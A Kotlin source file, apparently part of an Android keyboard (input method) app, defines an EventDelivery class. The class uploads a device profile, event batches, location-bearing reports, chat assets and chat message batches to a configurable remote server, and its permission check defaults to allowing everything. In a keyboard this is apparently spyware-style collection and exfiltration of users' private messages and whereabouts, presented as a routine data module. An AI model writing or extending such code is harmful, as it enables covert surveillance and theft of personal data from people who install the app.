package com.yuyan.imemodule.data.collect

import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.booleanOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.ConcurrentHashMap

/** 每个目标独立确认；网络调用只能由 IO 线程调用，失败保持数据库原状。 */
internal class EventDelivery(
    private val store: LocalInputStore,
    private val http: OkHttpClient,
    private val deviceId: String,
    private val deviceJson: String,
    private val allowed: (String?) -> Boolean = { true },
) {
    private val locks = ConcurrentHashMap<String, Any>()
    private val registered = ConcurrentHashMap.newKeySet<String>()
    private val json = Json { ignoreUnknownKeys = true }

    fun flush(target: String): Boolean = synchronized(locks.getOrPut(target) { Any() }) {
        try {
            if (!allowed(null)) return@synchronized false
            if (target !in registered) {
                if (!post(target, "/api/v1/mobile/device", deviceJson)) return@synchronized false
                registered.add(target)
            }
            val batch = store.pending(target)
            if (batch.isNotEmpty() && allowed("events")) {
                val body = json.encodeToString(EventBatch.serializer(), EventBatch(deviceId, batch))
                if (!post(target, "/api/v1/mobile/events/batch", body)) {
                    registered.remove(target) // 服务端可能重置了设备档案，下次先注册。
                    return@synchronized false
                }
                store.acknowledge(target, batch.map { it.id })
            }
            var reportsOk = true
            for (report in store.pendingReports(target, includeLocation = allowed("location"))) {
                if (!allowed(report.kind)) continue
                val sent = try {
                    val path = when (report.kind) {
                        "chat_asset" -> "/api/v1/mobile/chat/assets"
                        "chat_messages" -> "/api/v1/mobile/chat/messages/batch"
                        else -> "/api/v1/mobile/reports"
                    }
                    val isChat = report.kind.startsWith("chat_")
                    val payload = if (isChat) report.payload else buildJsonObject {
                        put("id", report.id); put("kind", report.kind); put("payload", json.parseToJsonElement(report.payload))
                    }.toString()
                    post(target, path, payload, if (isChat) null else report.id)
                } catch (_: Exception) { false }
                if (sent) store.acknowledgeReports(target, listOf(report.id))
                else {
                    store.deferReport(target, report.id) // 保留失败项，但给后续正常报告发送机会。
                    registered.remove(target)
                    reportsOk = false
                }
            }
            if (!reportsOk) return@synchronized false
            true
        } catch (_: Exception) {
            false
        }
    }
    private fun post(target: String, path: String, body: String, reportId: String? = null): Boolean {
        val request = Request.Builder().url(target + path).header("X-Device-Id", deviceId)
            .post(body.toRequestBody("application/json; charset=utf-8".toMediaType())).build()
        return http.newCall(request).execute().use { response ->
            // 避免把反向代理返回的 200 HTML 登录页当成入库成功。
            if (!response.isSuccessful) false else {
                val result = json.parseToJsonElement(response.body?.string() ?: "")
                result.jsonObject["ok"]?.jsonPrimitive?.booleanOrNull == true &&
                    (reportId == null || result.jsonObject["id"]?.jsonPrimitive?.content == reportId)
            }
        }
    }
}
